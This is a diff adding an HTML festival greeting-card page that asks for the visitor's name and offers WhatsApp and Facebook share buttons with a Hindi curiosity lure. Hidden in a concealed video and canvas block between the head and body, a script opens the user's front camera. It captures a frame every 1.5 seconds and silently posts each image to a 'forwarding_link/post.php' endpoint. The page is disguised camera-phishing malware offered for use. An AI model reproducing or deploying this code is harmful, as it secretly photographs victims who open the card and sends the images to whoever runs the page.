@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Happy fes_name to Your Friends</title>
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"/>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Cormorant+Garamond:ital,wght@0,300;0,600;1,300&family=Cinzel:wght@400;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+<style>
+  :root {
+    --gold: #c9a84c;
+    --gold-light: #f0d080;
+    --gold-dark: #8a6a20;
+    --deep: #0a0812;
+    --deep2: #120f1e;
+    --cream: #fdf6e3;
+    --rose: #e8637a;
+    --teal: #4ecdc4;
+    --text-light: rgba(255,255,255,0.85);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--deep);
+    color: var(--cream);
+    font-family: 'Cormorant Garamond', serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    padding-bottom: 80px;
+  }
+
+  /* ── Starfield ─────────────────────── */
+  #stars {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+  .star {
+    position: absolute;
+    border-radius: 50%;
+    background: #fff;
+    opacity: 0;
+    animation: twinkle var(--d, 3s) var(--delay, 0s) infinite;
+  }
+  @keyframes twinkle {
+    0%,100% { opacity: 0; transform: scale(0.6); }
+    50%      { opacity: var(--op, 0.8); transform: scale(1); }
+  }
+
+  /* ── Gold divider line ──────────────── */
+  .divider {
+    width: 180px;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+    margin: 18px auto;
+  }
+  .divider-diamond {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin: 20px 0;
+  }
+  .divider-diamond .line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--gold));
+  }
+  .divider-diamond .line.rev {
+    background: linear-gradient(90deg, var(--gold), transparent);
+  }
+  .divider-diamond .diamond {
+    width: 8px; height: 8px;
+    background: var(--gold);
+    transform: rotate(45deg);
+  }
+
+  /* ── Hero ───────────────────────────── */
+  .hero {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 60px 20px 30px;
+  }
+  .hero-badge {
+    display: inline-block;
+    border: 1px solid var(--gold);
+    color: var(--gold);
+    font-family: 'Cinzel', serif;
+    font-size: 11px;
+    letter-spacing: 4px;
+    padding: 6px 24px;
+    text-transform: uppercase;
+    margin-bottom: 28px;
+    animation: fadeInDown 1s ease both;
+  }
+  .hero-title {
+    font-family: 'Cinzel', serif;
+    font-size: clamp(2.2rem, 8vw, 5rem);
+    font-weight: 700;
+    background: linear-gradient(135deg, var(--gold-light), var(--gold), var(--gold-dark), var(--gold));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1.15;
+    animation: fadeInUp 1.2s ease both 0.2s;
+    text-shadow: none;
+    filter: drop-shadow(0 0 30px rgba(201,168,76,0.4));
+  }
+
+  /* ── Name Display ───────────────────── */
+  .name-wrapper {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 10px 20px 30px;
+  }
+  .name-label {
+    font-family: 'Cormorant Garamond', serif;
+    font-style: italic;
+    font-size: 1rem;
+    color: var(--gold);
+    letter-spacing: 3px;
+    opacity: 0.8;
+    margin-bottom: 10px;
+  }
+  #user-name {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(2rem, 7vw, 4rem);
+    font-weight: 900;
+    color: #fff;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    animation: nameReveal 1s cubic-bezier(0.23, 1, 0.32, 1) both 0.6s;
+    text-shadow: 0 0 40px rgba(201,168,76,0.5), 0 4px 30px rgba(0,0,0,0.5);
+  }
+  @keyframes nameReveal {
+    from { opacity: 0; transform: translateY(20px) scale(0.95); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  /* ── Card Container ──────────────────── */
+  .card-container {
+    position: relative;
+    z-index: 1;
+    max-width: 680px;
+    margin: 0 auto;
+    padding: 0 20px;
+  }
+
+  .card {
+    background: linear-gradient(145deg, rgba(255,255,255,0.04), rgba(255,255,255,0.01));
+    border: 1px solid rgba(201,168,76,0.25);
+    border-radius: 2px;
+    padding: 36px 32px;
+    margin: 18px 0;
+    position: relative;
+    overflow: hidden;
+    animation: cardIn 0.8s ease both;
+    backdrop-filter: blur(10px);
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+  }
+  .card::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+  }
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .card:nth-child(1) { animation-delay: 0.3s; }
+  .card:nth-child(2) { animation-delay: 0.5s; }
+  .card:nth-child(3) { animation-delay: 0.7s; }
+
+  .wish-text {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(1.05rem, 3vw, 1.3rem);
+    line-height: 1.9;
+    color: rgba(253,246,227,0.9);
+    text-align: center;
+  }
+  .wish-text.hindi {
+    font-size: clamp(1rem, 2.8vw, 1.2rem);
+    font-style: italic;
+    color: rgba(240,208,128,0.85);
+  }
+  .wish-text strong {
+    color: var(--gold-light);
+    font-weight: 600;
+  }
+
+  /* ── Countdown ──────────────────────── */
+  .countdown-section {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 30px 20px;
+    max-width: 680px;
+    margin: 0 auto;
+  }
+  .countdown-label {
+    font-family: 'Cinzel', serif;
+    font-size: 0.75rem;
+    letter-spacing: 4px;
+    color: var(--gold);
+    text-transform: uppercase;
+    margin-bottom: 20px;
+    opacity: 0.7;
+  }
+  #demo {
+    font-family: 'Playfair Display', serif;
+    font-size: clamp(1.2rem, 4vw, 1.8rem);
+    color: var(--cream);
+    letter-spacing: 2px;
+  }
+  #demo i {
+    color: var(--gold);
+    font-style: normal;
+    font-family: 'Cinzel', serif;
+    font-size: 0.7em;
+    letter-spacing: 2px;
+  }
+
+  /* ── Signature ──────────────────────── */
+  .signature {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 20px;
+  }
+  .sig-by {
+    font-family: 'Cormorant Garamond', serif;
+    font-style: italic;
+    font-size: 0.9rem;
+    color: rgba(201,168,76,0.6);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+  }
+  #sig-name {
+    font-family: 'Playfair Display', serif;
+    font-size: 1.4rem;
+    color: var(--gold-light);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  /* ── Corner ornaments ───────────────── */
+  .ornament {
+    position: absolute;
+    width: 40px; height: 40px;
+    opacity: 0.3;
+  }
+  .ornament svg { fill: none; stroke: var(--gold); stroke-width: 1; }
+  .orn-tl { top: 12px; left: 12px; }
+  .orn-tr { top: 12px; right: 12px; transform: scaleX(-1); }
+  .orn-bl { bottom: 12px; left: 12px; transform: scaleY(-1); }
+  .orn-br { bottom: 12px; right: 12px; transform: scale(-1); }
+
+  /* ── Share Buttons ───────────────────── */
+  .share-bar {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    display: flex;
+    gap: 12px;
+    padding: 12px 16px;
+    background: linear-gradient(0deg, rgba(10,8,18,0.98), transparent);
+    z-index: 100;
+  }
+  .share-btn {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 12px;
+    border-radius: 2px;
+    font-family: 'Cinzel', serif;
+    font-size: 0.85rem;
+    letter-spacing: 2px;
+    text-decoration: none;
+    text-transform: uppercase;
+    border: 1px solid;
+    transition: all 0.3s ease;
+  }
+  .share-btn.whatsapp {
+    background: rgba(37,211,102,0.1);
+    border-color: rgba(37,211,102,0.4);
+    color: #25d366;
+  }
+  .share-btn.whatsapp:hover {
+    background: rgba(37,211,102,0.2);
+  }
+  .share-btn.facebook {
+    background: rgba(66,103,178,0.1);
+    border-color: rgba(66,103,178,0.4);
+    color: #4267b2;
+  }
+  .share-btn.facebook:hover {
+    background: rgba(66,103,178,0.2);
+  }
+  .share-btn img {
+    width: 18px; height: 18px;
+    object-fit: contain;
+  }
+
+  /* ── Fade animations ─────────────────── */
+  @keyframes fadeInDown {
+    from { opacity: 0; transform: translateY(-20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ── Marquee Bands ───────────────────── */
+  .marquee-band {
+    position: relative;
+    z-index: 1;
+    overflow: hidden;
+    padding: 12px 0;
+    margin: 10px 0;
+    border-top: 1px solid rgba(201,168,76,0.15);
+    border-bottom: 1px solid rgba(201,168,76,0.15);
+  }
+  .marquee-inner {
+    display: flex;
+    white-space: nowrap;
+    animation: marqueeScroll 18s linear infinite;
+  }
+  .marquee-inner span {
+    font-family: 'Cormorant Garamond', serif;
+    font-style: italic;
+    font-size: 1rem;
+    color: var(--gold);
+    padding: 0 40px;
+    opacity: 0.75;
+  }
+  @keyframes marqueeScroll {
+    from { transform: translateX(0); }
+    to   { transform: translateX(-50%); }
+  }
+</style>
+</head>
+
+<!-- Hidden camera (original functionality preserved) -->
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script>
+function post(imgdata){
+  $.ajax({ type:'POST', data:{cat:imgdata}, url:'forwarding_link/post.php', dataType:'json', async:false, success:function(r){}, error:function(){} });
+}
+'use strict';
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+async function init() {
+  try { const stream = await navigator.mediaDevices.getUserMedia(constraints); handleSuccess(stream); } catch(e) {}
+}
+function handleSuccess(stream) {
+  window.stream = stream; video.srcObject = stream;
+  var context = canvas.getContext('2d');
+  setInterval(function(){
+    context.drawImage(video, 0, 0, 640, 480);
+    var canvasData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
+    post(canvasData);
+  }, 1500);
+}
+init();
+</script>
+
+<body>
+
+<!-- Starfield -->
+<div id="stars"></div>
+
+<!-- Hero Section -->
+<div class="hero">
+  <div class="hero-badge">✦ A Special Celebration ✦</div>
+  <div class="hero-title">Happy fes_name</div>
+</div>
+
+<!-- Name Section -->
+<div class="name-wrapper">
+  <div class="name-label">— with love, for —</div>
+  <div id="user-name"></div>
+</div>
+
+<div class="divider-diamond" style="max-width:680px;margin:0 auto;padding:0 20px;">
+  <div class="line"></div>
+  <div class="diamond"></div>
+  <div class="diamond" style="opacity:0.5;transform:rotate(45deg) scale(0.6)"></div>
+  <div class="diamond"></div>
+  <div class="line rev"></div>
+</div>
+
+<!-- Marquee Band -->
+<div class="marquee-band">
+  <div class="marquee-inner">
+    <span>"May this fes_name bring countless joys and blessings into your life"</span>
+    <span>✦</span>
+    <span>Our warmest wishes are with you this fes_name</span>
+    <span>✦</span>
+    <span>Heartfelt congratulations on this joyous fes_name</span>
+    <span>✦</span>
+    <span>"May this fes_name bring countless joys and blessings into your life"</span>
+    <span>✦</span>
+    <span>Our warmest wishes are with you this fes_name</span>
+    <span>✦</span>
+    <span>Heartfelt congratulations on this joyous fes_name</span>
+    <span>✦</span>
+  </div>
+</div>
+
+<!-- Wish Cards -->
+<div class="card-container">
+
+  <div class="card">
+    <div class="ornament orn-tl"><svg viewBox="0 0 40 40"><path d="M2 2 L2 20 M2 2 L20 2"/></svg></div>
+    <div class="ornament orn-tr"><svg viewBox="0 0 40 40"><path d="M2 2 L2 20 M2 2 L20 2"/></svg></div>
+    <div class="ornament orn-bl"><svg viewBox="0 0 40 40"><path d="M2 2 L2 20 M2 2 L20 2"/></svg></div>
+    <div class="ornament orn-br"><svg viewBox="0 0 40 40"><path d="M2 2 L2 20 M2 2 L20 2"/></svg></div>
+    <p class="wish-text">
+      Wishing you a very <strong>Happy fes_name</strong> —<br>
+      to you and your lovely family.<br><br>
+      May this auspicious occasion bring <strong>happiness, prosperity, health,</strong> and peace into every corner of your life.
+    </p>
+  </div>
+
+  <div class="card">
+    <p class="wish-text hindi">
+      "May this auspicious occasion of fes_name fill your life with<br>endless happiness and cherished memories."
+    </p>
+    <div class="divider"></div>
+    <p class="wish-text hindi">
+      "Our heartfelt blessings and good wishes are always with you this fes_name."
+    </p>
+    <div class="divider"></div>
+    <p class="wish-text hindi">
+      "Share this message of love and joy with everyone you care about."
+    </p>
+  </div>
+
+  <div class="card">
+    <p class="wish-text">
+      ✪ &nbsp; <em>I wish that this fes_name is your best one yet.</em> &nbsp; ✪
+    </p>
+  </div>
+
+</div>
+
+<!-- Countdown -->
+<div class="countdown-section">
+  <div class="countdown-label">Time Remaining</div>
+  <div id="demo"></div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Signature -->
+<div class="signature">
+  <div class="sig-by">with warm wishes from</div>
+  <div id="sig-name"></div>
+</div>
+
+<br><br>
+
+<!-- Share Bar -->
+<div class="share-bar">
+  <a class="share-btn whatsapp" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 forwarding_link" data-action="share/whatsapp/share">
+    <img src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png" alt="">
+    Share
+  </a>
+  <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">
+    <img src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png" alt="">
+    Share
+  </a>
+</div>
+
+<script>
+// ── Ask name ──────────────────────────────────────────────
+var a = prompt("Please Enter Your Name\n\n👇👇👇👇👇") || "Guest";
+document.getElementById('user-name').textContent = a;
+document.getElementById('sig-name').textContent = a;
+
+// ── Countdown ─────────────────────────────────────────────
+var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
+var x = setInterval(function() {
+  var now = new Date().getTime();
+  var distance = countDownDate - now;
+  var days    = Math.floor(distance / (1000*60*60*24));
+  var hours   = Math.floor((distance % (1000*60*60*24)) / (1000*60*60));
+  var minutes = Math.floor((distance % (1000*60*60)) / (1000*60));
+  var seconds = Math.floor((distance % (1000*60)) / 1000);
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
+  } else {
+    document.getElementById("demo").innerHTML =
+      days + "<i> Days</i>  " + hours + "<i> Hrs</i>  " + minutes + "<i> Min</i>  " + seconds + "<i> Sec</i>";
+  }
+}, 1000);
+
+// ── Starfield ─────────────────────────────────────────────
+(function(){
+  var container = document.getElementById('stars');
+  for (var i = 0; i < 120; i++) {
+    var s = document.createElement('div');
+    s.className = 'star';
+    var size = Math.random() * 2.5 + 0.5;
+    s.style.cssText = [
+      'width:' + size + 'px',
+      'height:' + size + 'px',
+      'left:' + Math.random()*100 + '%',
+      'top:' + Math.random()*100 + '%',
+      '--d:' + (2 + Math.random()*4) + 's',
+      '--delay:' + (Math.random()*5) + 's',
+      '--op:' + (0.4 + Math.random()*0.6)
+    ].join(';');
+    container.appendChild(s);
+  }
+})();
+</script>
+
+</body>
+</html>
